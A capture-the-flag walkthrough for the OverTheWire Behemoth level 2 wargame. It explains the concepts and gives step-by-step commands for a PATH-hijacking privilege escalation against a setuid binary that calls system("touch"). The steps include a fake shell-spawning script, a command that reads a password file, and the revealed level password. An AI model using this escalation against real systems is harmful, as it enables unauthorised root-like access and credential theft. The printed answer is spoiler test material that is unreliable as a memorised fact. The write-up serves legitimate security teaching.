# Behemoth Level 2 → 3

## Goal

`behemoth2` runs an external command via `system()` using a **relative** command name (like `touch`). You can take advantage of that by putting a malicious script with the same name earlier in your `PATH` — the binary runs your script instead of the real command, and your script runs as `behemoth3`.

## Concepts you'll learn

- `system()` vs. `execve()` — `system("touch ...")` resolves `touch` via `$PATH`, which is attacker-controllable
- Tracing library calls with `ltrace` and syscalls with `strace`
- How `$PATH` lookup works (first match wins) and why that's a classic escalation primitive
- Dropping a fake binary/script into a writable directory and prepending it to `$PATH`

## Walkthrough

### 1. Log in and poke at the binary

```bash
$ ssh behemoth2@behemoth.labs.overthewire.org -p 2221
$ cd /behemoth
$ ls -l behemoth2
-r-sr-x--- 1 behemoth3 behemoth2 ... behemoth2

$ ./behemoth2
(does something, maybe prints a PID, then exits or waits)
```

### 2. Trace what it calls

```bash
$ ltrace ./behemoth2
```

Among the output you'll see something like:

```
getpid()                                    = 12345
sprintf("touch /tmp/12345", "touch /tmp/%d", 12345)
system("touch /tmp/12345" <no return ...>
```

Two tells:

- It's running `touch` via `system()` — `system()` does a `/bin/sh -c` which consults `$PATH` for the command.
- The command is `touch`, a short unqualified name — prime target for PATH hijacking.

`strace` (syscall tracer) tells the same story from the other side:

```bash
$ strace -f ./behemoth2 2>&1 | grep -E 'exec|touch'
execve("/bin/sh", ["sh", "-c", "touch /tmp/12345"], ...)
execve("/usr/bin/touch", ["touch", "/tmp/12345"], ...)
```

### 3. Set up a fake `touch`

Make a writable working directory, put a fake `touch` in it that gives you a shell:

```bash
$ mkdir /tmp/t2work
$ cd /tmp/t2work
$ cat > touch <<'EOF'
#!/bin/sh
/bin/sh
EOF
$ chmod +x touch
```

Now `./touch` is a script that spawns a new shell.

### 4. Prepend the directory to `$PATH` and run the binary

```bash
$ export PATH=/tmp/t2work:$PATH
$ /behemoth/behemoth2
$ whoami
behemoth3
```

What happened: `/behemoth/behemoth2` calls `system("touch /tmp/<pid>")`. The shell's `$PATH` was inherited from your environment, so the **first** `touch` it finds is `/tmp/t2work/touch`, which is your script. Because `behemoth2` is setuid `behemoth3`, the shell your script spawns runs as `behemoth3`.

### 5. Read the next password

```bash
$ cat /etc/behemoth_pass/behemoth3
nieteidiel
```

## The answer

The password for `behemoth3` is:

**`nieteidiel`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/behemoth/behemoth2.html>
